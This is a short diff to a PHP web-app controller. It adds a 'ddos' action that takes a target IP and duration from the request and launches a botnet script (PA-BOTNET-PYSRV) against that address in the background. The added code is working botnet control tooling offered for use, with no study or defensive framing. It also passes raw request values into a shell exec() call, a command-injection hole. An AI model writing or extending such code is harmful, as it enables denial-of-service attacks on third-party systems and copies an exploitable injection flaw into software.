@@ -113,4 +113,19 @@ class NetworkController extends Controller
        
         return redirect()->route('network')->with('success', 'Réseau supprimé avec succès.');
     }
+
+    public function ddos(Request $request)
+    {
+        $group_id = $request->group_id;
+        $group_name = $request->group_name;
+        $ip_address = $request->ip_address;
+        $duration = $request->duration;
+
+        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --ddos --group $group_name --address $ip_address --time $duration > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        $pid = $output[0];
+
+        return redirect("/network/$group_id")->with('output', "DDoS lancé sur l'adresse $ip_address pour $duration secondes.");
+    }
 }
